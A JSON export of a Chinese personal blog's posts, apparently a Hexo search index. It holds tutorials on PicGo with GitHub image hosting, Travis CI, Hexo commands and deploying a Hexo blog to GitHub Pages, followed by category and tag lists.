通常配置完成之后，就可以直接使用了。 如果你上传失败的情况，可以打开PicGo 的日志看看具体是什么异常 如果得到了这样的异常，那么大概率是因为你没有开启全局代理。 1[PicGo ERROR] RequestError: Error: connect ECONNREFUSED 13.250.168.23:443&#96; 因为GitHub 服务器和国内 GFW 的问题会导致有时上传成功，有时上传失败，所以需要自备好科学上网工具。 如果你还有其他问题，可以查阅 PicGo FAQ。 总结 如果你和我一样，讨厌域名备案，又希望能有一个免费、稳定的图床，那么一定不要错过GitHub 图床。 如果你只是需要存储一些不怎么重要的图片，那么可以使用免费不限大小的SM.MS图床。 如果打算长期稳定使用可以优先选择又拍云或者七牛云。","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"Skill","slug":"Tutorial/Skill","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/"},{"name":"GitHub","slug":"Tutorial/Skill/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/GitHub/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"}]},{"title":"Travis CI 快速上手","slug":"travis-ci-quick-start","date":"2020-07-05T06:25:58.000Z","updated":"2020-07-09T13:12:54.040Z","comments":true,"path":"travis-ci-quick-start/","link":"","permalink":"https://www.0x2beace.com/travis-ci-quick-start/","excerpt":"最近使用Github Pages 搭建Hexo 时，用到了一项新技术。hmm…也不能说是新技术吧，只是之前一直有听说，但却没有实际用过。 它就是持续集成，听上去好像是一个高大上的概念，但通俗一点解释就是：写完代码提交之后，会根据你的要求，自动做编译测试。 其中最出名大概就是Travis CI了，本文的目的就是快速入门 Travis CI。","text":"最近使用Github Pages 搭建Hexo 时，用到了一项新技术。hmm…也不能说是新技术吧，只是之前一直有听说，但却没有实际用过。 它就是持续集成，听上去好像是一个高大上的概念，但通俗一点解释就是：写完代码提交之后，会根据你的要求，自动做编译测试。 其中最出名大概就是Travis CI了，本文的目的就是快速入门 Travis CI。 什么是持续集成？持续集成(Continuous Integration)是对小周期的的代码进行更改，其目的是通过以较小的增量开发和测试来构建更健康的软件。 而Travis CI 作为一个持续集成平台，通过自动构建和测试代码，并提供更改成功的即时反馈。 快速上手在正式开始之前，需要提前准备好以下先决条件： 一个 GitHub 帐户 托管在 Github 的项目的所有者权限 需要注意的是：Travis CI不是完全免费的服务，前100个私有构建是免费的，后续就要进行付费，如果你的项目是开源的，或者你是学生，则不受限制。 在Github 上使用Travis CI 将 Travis CI 添加到你的 GitHub 账户中。 前往 GitHub 的 Applications settings，配置 Travis CI 权限，使其能够访问你的 repository。 前往 GitHub 新建 Personal Access Token，只勾选 repo 的权限并生成一个新的 Token。Token 生成后请复制并保存好。 回到 Travis CI，前往你的 repository 的设置页面，在 Environment Variables 下新建一个环境变量，Name 为 GH_TOKEN，Value 为刚才你在 GitHub 生成的 Token。确保 DISPLAY VALUE IN BUILD LOG 保持 不被勾选 避免你的 Token 泄漏。点击 Add 保存。 在你的项目中新建一个 .travis.yml 文件。 提交并推送以触发Travis CI构建。 其中.travis.yml文件的目的是告诉 Travis CI 应该做些什么。 以下示例指定了应使用Ruby 2.2和最新版本的JRuby构建的Ruby项目。 1234language: rubyrvm: - 2.2 - jruby 通过访问Travis CI 并选择repository，检查构建状态页面，以根据构建命令的返回状态查看构建是否通过或失败。","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"CI","slug":"CI","permalink":"https://www.0x2beace.com/tags/CI/"}]},{"title":"Hexo 快速上手","slug":"hexo-quick-start","date":"2020-07-05T06:16:31.000Z","updated":"2020-08-15T01:05:05.993Z","comments":true,"path":"hexo-quick-start/","link":"","permalink":"https://www.0x2beace.com/hexo-quick-start/","excerpt":"最近使用Hexo 搭建了一套博客系统，整个过程还算顺利，不过还是遇到了一些问题，整理记录一下。","text":"最近使用Hexo 搭建了一套博客系统，整个过程还算顺利，不过还是遇到了一些问题，整理记录一下。 常用命令init新建一个网站。如果没有设置 folder，Hexo 默认在目前的文件夹建立网站。 1$ hexo init [folder] newlayout 有三种选择： post：新建一片文章 page：新建一个页面 draft：新建一篇草稿 如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。 1$ hexo new [layout] &lt;title&gt; generate生成静态文件。 12$ hexo generate&#x2F;&#x2F; 等效于 hexo g 常用参数：|选项|描述||-|-||-d, –deploy|文件生成后立即部署网站||-w, –watch|监视文件变动||-b, –bail|生成过程中如果发生任何未处理的异常则抛出异常| publish发表草稿 1$ hexo publish [layout] &lt;filename&gt; server启动服务器。默认情况下，访问网址为： http://localhost:4000/。 12$ hexo server&#x2F;&#x2F; 等效于 hexo s deploy部署网站。 12$ hexo deploy&#x2F;&#x2F; 等效于 hexo d -g，--generate：部署之前预先生成静态文件 clean清除缓存文件 (db.json) 和已生成的静态文件 (public)。 在某些情况（尤其是更换主题后），如果发现对站点的更改无论如何也不生效，那可能需要运行该命令。 1$ hexo clean list列出网站资料。 1$ hexo list version显示 Hexo 版本。 1$ hexo version 其他模式安全模式在安全模式下，不会载入插件和脚本。当需要安装新插件遭遇问题时，可以尝试以安全模式重新执行。 1$ hexo --safe 调试模式在终端中显示调试信息并记录到 debug.log。 1$ hexo --debug 显示草稿显示 source/_drafts 文件夹中的草稿文章。 1$ hexo --draft 常见问题CNAME 文件被删除GitHub Pages 为我们免费提供了&lt;username&gt;.github.io这样的域名作为 GitHub Page，但如果你觉得这个域名太长了，不满意，那么你也可以绑定自己的域名。 通常绑定完成之后，会在项目目录下面生成一个叫做CNAME的文件，这个文件的作用就是用来记录GitHub Pages 所绑定的域名。 这个时候就会产生一个问题： CNAME文件会在每次 hexo deploy 时消失，然后需要重新手动绑定，这样就很繁琐。 有以下几种方式可以解决这个问题： 每次 hexo d 之后，就去 GitHub 仓库根目录新建 CNAME文件。—— 繁琐 在 hexo g 之后， hexo d 之前，把CNAME文件复制到 public 目录下面，里面写入你要绑定的域名。—— 繁琐 将需要上传至 GitHub 的内容放在source文件夹，例如CNAME、favicon.ico、images等，这样在 hexo d 之后就不会被删除了。 通过安装插件实现永久保留。 1$ npm install hexo-generator-cname --save 编辑_config.yml 12Plugins:- hexo-generator-cname 推荐第三种方式，简单方便。 配置apex 域Github Pages 是支持绑定自己的私有域名的，但默认只能绑定 CNAME的私有子域名，那有没有办法主域名呢？ 答案是有的。 如果绑定主域名，例如 example.com，建议还设置一个 www 子域，GitHub Pages 将自动在域之间创建重定向，当输入example.com时，会重定向到 www.example.com。 通常我们绑定好私有子域名之后，回生成一个CNAME的文件，里面记录着我们绑定好的私有子域名。 此时只需要去DNS 做解析，创建一个ALIAS、ANAME 或 A 记录： 创建ALIAS、ANAME记录：将 apex 域指向站点的默认域。 创建A 记录：将 apex 域指向 GitHub Pages 的 IP 地址。 12345&#x2F;&#x2F; GitHub Pages 的 IP 地址185.199.108.153185.199.109.153185.199.110.153185.199.111.153 这里我选择的是创建A 记录，所以我的DNS 解析是这样的： 配置完DNS 解析之后，可以使用dig命令来检验是否解析成功： 12345678$ dig example.com +noall +answer; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; 0x2BeAce.com +noall +answer;; global options: +cmd0x2BeAce.com. 4502 IN A 185.199.111.1530x2BeAce.com. 4502 IN A 185.199.110.1530x2BeAce.com. 4502 IN A 185.199.108.1530x2BeAce.com. 4502 IN A 185.199.109.153 将example.com 替换成你自己的 apex 域，确认结果与上面 GitHub Pages 的 IP 地址相匹配。 至此，就完成了apex 域的配置了。 参考链接 github+hexo搭建自己的博客网站（七）注意事项 Hexo | 指令 管理 GitHub Pages 站点的自定义域","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"}]},{"title":"Github Pages 部署 Hexo 个人博客","slug":"deploy-hexo-using-github-pages-personal-blog","date":"2020-07-04T12:09:09.000Z","updated":"2020-08-15T01:11:07.291Z","comments":true,"path":"deploy-hexo-using-github-pages-personal-blog/","link":"","permalink":"https://www.0x2beace.com/deploy-hexo-using-github-pages-personal-blog/","excerpt":"关于个人博客，在很久之前就想自己搭建一套，甚至还为此买了一台服务器，但奈何自己太忙了(tai lan le) =_=，这件事情就一直搁浅了，服务器大部分时间也都是空闲状态。 这段时间，突然很想把这件事情做好，觉得不能在这么拖下去了，所以便有了这篇文章。","text":"关于个人博客，在很久之前就想自己搭建一套，甚至还为此买了一台服务器，但奈何自己太忙了(tai lan le) =_=，这件事情就一直搁浅了，服务器大部分时间也都是空闲状态。 这段时间，突然很想把这件事情做好，觉得不能在这么拖下去了，所以便有了这篇文章。 为什么使用Github Pages？ 我是出于以下原因考虑的： 暂时没有服务器的需要，我只想有一个能写博客的地方。 GitHub Pages 可以提供 https服务，我不用担心域名备案的问题。 免费 总之，如果你想用最简单、最省心的方式，搭建属于自己的博客，那么 Github Pages 一定不会让你失望。 系统环境 Mac OS 10.15.4 Node.js 12 Hexo-cli: 3.1 NPM: 6.9 创建Github PagesGithub Pages分为两类，用户或组织主页、项目主页。 用户或组织主页：在新建仓库时，仓库名称应该以&lt;yourusername&gt;.github.io的格式去填写。&lt;yourusername&gt;指的是你的Github 的用户名称。 创建项目主页：在新建仓库时，名称可以任意设置，然后通过Setting-&gt;Options-&gt;Github Pages将 Source选项设置为Master Branch，此时这个项目就变成一个 Github Pages项目了。 需要注意的是： Github Pages 只针对开源的项目是免费的，如果你不想开源，那可能就需要考虑收费的套餐了。 第一种方式不能更改 Github Pages 部署分支。 如果你有自己的域名，那么推荐使用方式二创建 Github Pages。如果你没有自己的域名，那也没有关系，可以使用Github Pages 提供的域名访问http://&lt;yourusername&gt;.github.io。 绑定域名如果你是通过方式一，创建的Github Pages，那么可以跳过此部分。 在 2018 年 5 月 1 日之后，GitHub Pages 已经开始提供免费为自定义域名开启 HTTPS 的功能，并且大大简化了操作的流程，现在用户已经不再需要自己提供证书，只需要将自己的域名使用 CNAME 的方式指向自己的 GitHub Pages 域名即可。 首先需要在你的 DNS 解析里添加一条解析记录，例如我选择添加子域名blog.aikang.me，通过 CNAME 的方式指向我刚刚自定义的 GitHub Pages 域名 0xAiKang.github.io。 添加完成后等待 DNS 解析的生效的同时回到项目的Setting界面，将刚才的子域名与 Github Pages 绑定在一起。 保存之后，我们只需要耐心等待 GitHub 生成证书并确认域名的解析是否正常。 将Hexo 部署到Github Pages域名解析成功之后，就可以通过我们刚才绑定的域名进行访问了，但是你会发现，现在只能看到一片空白，这是因为我们的网站还没有任何内容，所以下一步需要做的就是选择一套静态模版系统。 目前市场上有很多优秀的静态模板系统，比如： Node.js 编写的 Hexo Go 编写的 Hugo Python 编写的 Pelican 静态博客写作客户端 Gridea 为什么要选择Hexo？ 最初在选择博客模版系统时，并没有发现 Gridea ，事后发现这个小众的静态博客写作客户端似乎才是我真正想要的。 不过既然选择了Hexo，也是因为它的生态环境很大，可选主题非常多，并且都是开源的。 如何将 Hexo 部署到 GitHub Pages？ 将 Travis CI 添加到你的 GitHub 账户中。 前往 GitHub 的 Applications settings，配置 Travis CI 权限，使其能够访问你的 repository。 正常情况下你会被重定向到 Travis CI 的页面。如果没有，请 手动前往。 前往 GitHub 新建 Personal Access Token，只勾选 repo 的权限并生成一个新的 Token。Token 生成后请复制并保存好。 回到 Travis CI，前往你的 repository 的设置页面，在 Environment Variables 下新建一个环境变量，Name 为 GH_TOKEN，Value 为刚才你在 GitHub 生成的 Token。确保 DISPLAY VALUE IN BUILD LOG 保持 不被勾选 避免你的 Token 泄漏。点击 Add 保存。 在你的 Hexo 站点文件夹中新建一个 .travis.yml 文件： 123456789101112131415161718sudo: falselanguage: node_jsnode_js: - 10 # use nodejs v10 LTScache: npmbranches: only: - master # build master branch onlyscript: - hexo generate # generate static filesdeploy: provider: pages skip-cleanup: true github-token: $GH_TOKEN keep-history: true on: branch: master local-dir: public 上面这个配置文件的作用是用来自动构建，编译测试。 将 .travis.yml 推送到 repository 中。Travis CI 会自动开始运行，并将生成的文件推送到同一 repository 下的 gh-pages 分支下。 修改发布源推送完成之后，会发现多了一个 gh-gages分支，这个分支就是用于部署站点的分支，但是GitHub Pages 会默认使用master分支作为发布源，所以我们需要切换发布源。 在Setting-&gt;Option-&gt;GitHub Pages下，使用 Source（源）下拉菜单选择发布源。 注意：使用用户或组织主页构建的 Github Pages 不能修改发布源，只能使用默认的 master分支。 一键部署Hexo 提供了快速方便的一键部署功能，让你只需一条命令就能将网站部署到服务器上。 在正式部署之前，我们需要先修改_config.yml 文件，配置参数。 12345deploy: type: git repo: &lt;repository url&gt; #https:&#x2F;&#x2F;bitbucket.org&#x2F;JohnSmith&#x2F;johnsmith.bitbucket.io branch: [branch] message: [message] 参数 描述 默认值 type deployer - repo 项目地址 - branch 分支名称 gh-pages 有以下两点需要注意：1.repo 需要选择SSH 协议，HTTPS协议会报错。2.branch 选择Github Pages中设置的那个分支，而不是拉取这个项目的分支 我这里使用的是git 作为 deployer，所以需要手动安装一个插件。 1npm install hexo-deployer-git --save 生成站点文件并部署至远程库： 1hexo clean &amp;&amp; hexo deploy --generate 至此，就完成了使用Github Pages 部署 Hexo 个人博客的全部过程，总的来说还是很顺利的。 参考链接 Github Pages 搭建教程 将Hexo 部署到 GitHub Pages Hexo 一键部署 Github Pages部署个人博客（Hexo篇）","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"GitHub","slug":"Tutorial/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/GitHub/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"}]}],"categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"PHP","slug":"Linux/PHP","permalink":"https://www.0x2beace.com/categories/Linux/PHP/"},{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/categories/Skill/"},{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/categories/Redis/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/categories/Mac/"},{"name":"碎碎念","slug":"碎碎念","permalink":"https://www.0x2beace.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"},{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"},{"name":"Tips","slug":"Tips","permalink":"https://www.0x2beace.com/categories/Tips/"},{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"},{"name":"Mac","slug":"Linux/Mac","permalink":"https://www.0x2beace.com/categories/Linux/Mac/"},{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"Docker","slug":"Linux/Docker","permalink":"https://www.0x2beace.com/categories/Linux/Docker/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"},{"name":"终端","slug":"终端","permalink":"https://www.0x2beace.com/categories/%E7%BB%88%E7%AB%AF/"},{"name":"Tutorial","slug":"Docker/Tutorial","permalink":"https://www.0x2beace.com/categories/Docker/Tutorial/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"},{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"},{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/categories/Socket-io/"},{"name":"Nginx","slug":"Socket-io/Nginx","permalink":"https://www.0x2beace.com/categories/Socket-io/Nginx/"},{"name":"Skill","slug":"Git/Skill","permalink":"https://www.0x2beace.com/categories/Git/Skill/"},{"name":"Windows","slug":"Linux/Windows","permalink":"https://www.0x2beace.com/categories/Linux/Windows/"},{"name":"Windows","slug":"Skill/Windows","permalink":"https://www.0x2beace.com/categories/Skill/Windows/"},{"name":"Mac","slug":"Skill/Windows/Mac","permalink":"https://www.0x2beace.com/categories/Skill/Windows/Mac/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/categories/Shell/"},{"name":"Tutorial","slug":"PHP/Tutorial","permalink":"https://www.0x2beace.com/categories/PHP/Tutorial/"},{"name":"进程管理","slug":"PHP/Tutorial/进程管理","permalink":"https://www.0x2beace.com/categories/PHP/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/categories/Node/"},{"name":"Socket.io","slug":"Node/Socket-io","permalink":"https://www.0x2beace.com/categories/Node/Socket-io/"},{"name":"一些经验","slug":"一些经验","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"},{"name":"命令整理","slug":"Linux/命令整理","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"Tutorial","slug":"Node/Tutorial","permalink":"https://www.0x2beace.com/categories/Node/Tutorial/"},{"name":"进程管理","slug":"Node/Tutorial/进程管理","permalink":"https://www.0x2beace.com/categories/Node/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"GitHub","slug":"Tutorial/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/GitHub/"},{"name":"前端","slug":"前端","permalink":"https://www.0x2beace.com/categories/%E5%89%8D%E7%AB%AF/"},{"name":"Skill","slug":"Tutorial/Skill","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/"},{"name":"GitHub","slug":"Tutorial/Skill/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/GitHub/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"},{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"},{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Google Search","slug":"Google-Search","permalink":"https://www.0x2beace.com/tags/Google-Search/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"},{"name":"持久化","slug":"持久化","permalink":"https://www.0x2beace.com/tags/%E6%8C%81%E4%B9%85%E5%8C%96/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.0x2beace.com/tags/Ubuntu/"},{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Google Drive","slug":"Google-Drive","permalink":"https://www.0x2beace.com/tags/Google-Drive/"},{"name":"碎碎念","slug":"碎碎念","permalink":"https://www.0x2beace.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"},{"name":"Crontab","slug":"Crontab","permalink":"https://www.0x2beace.com/tags/Crontab/"},{"name":"进程","slug":"进程","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"线程","slug":"线程","permalink":"https://www.0x2beace.com/tags/%E7%BA%BF%E7%A8%8B/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"Cygwin","slug":"Cygwin","permalink":"https://www.0x2beace.com/tags/Cygwin/"},{"name":"MarkDown","slug":"MarkDown","permalink":"https://www.0x2beace.com/tags/MarkDown/"},{"name":"Vim","slug":"Vim","permalink":"https://www.0x2beace.com/tags/Vim/"},{"name":"Socket","slug":"Socket","permalink":"https://www.0x2beace.com/tags/Socket/"},{"name":"PDO","slug":"PDO","permalink":"https://www.0x2beace.com/tags/PDO/"},{"name":"MQ","slug":"MQ","permalink":"https://www.0x2beace.com/tags/MQ/"},{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"},{"name":"Terminal","slug":"Terminal","permalink":"https://www.0x2beace.com/tags/Terminal/"},{"name":"Mysqli","slug":"Mysqli","permalink":"https://www.0x2beace.com/tags/Mysqli/"},{"name":"PHPStorm","slug":"PHPStorm","permalink":"https://www.0x2beace.com/tags/PHPStorm/"},{"name":"算法","slug":"算法","permalink":"https://www.0x2beace.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"局域网","slug":"局域网","permalink":"https://www.0x2beace.com/tags/%E5%B1%80%E5%9F%9F%E7%BD%91/"},{"name":"防火墙","slug":"防火墙","permalink":"https://www.0x2beace.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"Postman","slug":"Postman","permalink":"https://www.0x2beace.com/tags/Postman/"},{"name":"JSON","slug":"JSON","permalink":"https://www.0x2beace.com/tags/JSON/"},{"name":"Xdebug","slug":"Xdebug","permalink":"https://www.0x2beace.com/tags/Xdebug/"},{"name":"DevOps","slug":"DevOps","permalink":"https://www.0x2beace.com/tags/DevOps/"},{"name":"K8S","slug":"K8S","permalink":"https://www.0x2beace.com/tags/K8S/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.0x2beace.com/tags/HTTPS/"},{"name":"SSL","slug":"SSL","permalink":"https://www.0x2beace.com/tags/SSL/"},{"name":"Certbot","slug":"Certbot","permalink":"https://www.0x2beace.com/tags/Certbot/"},{"name":"HTTP","slug":"HTTP","permalink":"https://www.0x2beace.com/tags/HTTP/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"},{"name":"监控系统","slug":"监控系统","permalink":"https://www.0x2beace.com/tags/%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/"},{"name":"终端","slug":"终端","permalink":"https://www.0x2beace.com/tags/%E7%BB%88%E7%AB%AF/"},{"name":"Docker Hub","slug":"Docker-Hub","permalink":"https://www.0x2beace.com/tags/Docker-Hub/"},{"name":"SSH","slug":"SSH","permalink":"https://www.0x2beace.com/tags/SSH/"},{"name":"SSHD","slug":"SSHD","permalink":"https://www.0x2beace.com/tags/SSHD/"},{"name":"GoAccess","slug":"GoAccess","permalink":"https://www.0x2beace.com/tags/GoAccess/"},{"name":"Logs","slug":"Logs","permalink":"https://www.0x2beace.com/tags/Logs/"},{"name":"云","slug":"云","permalink":"https://www.0x2beace.com/tags/%E4%BA%91/"},{"name":"Linux Commands","slug":"Linux-Commands","permalink":"https://www.0x2beace.com/tags/Linux-Commands/"},{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"},{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/tags/Socket-io/"},{"name":"wss","slug":"wss","permalink":"https://www.0x2beace.com/tags/wss/"},{"name":"Arch Linux","slug":"Arch-Linux","permalink":"https://www.0x2beace.com/tags/Arch-Linux/"},{"name":"WSL","slug":"WSL","permalink":"https://www.0x2beace.com/tags/WSL/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"},{"name":"进程管理","slug":"进程管理","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"Supervisor","slug":"Supervisor","permalink":"https://www.0x2beace.com/tags/Supervisor/"},{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"},{"name":"Hash","slug":"Hash","permalink":"https://www.0x2beace.com/tags/Hash/"},{"name":"Web 安全","slug":"Web-安全","permalink":"https://www.0x2beace.com/tags/Web-%E5%AE%89%E5%85%A8/"},{"name":"ssh","slug":"ssh","permalink":"https://www.0x2beace.com/tags/ssh/"},{"name":"PM2","slug":"PM2","permalink":"https://www.0x2beace.com/tags/PM2/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://www.0x2beace.com/tags/JavaScript/"},{"name":"CI","slug":"CI","permalink":"https://www.0x2beace.com/tags/CI/"}]}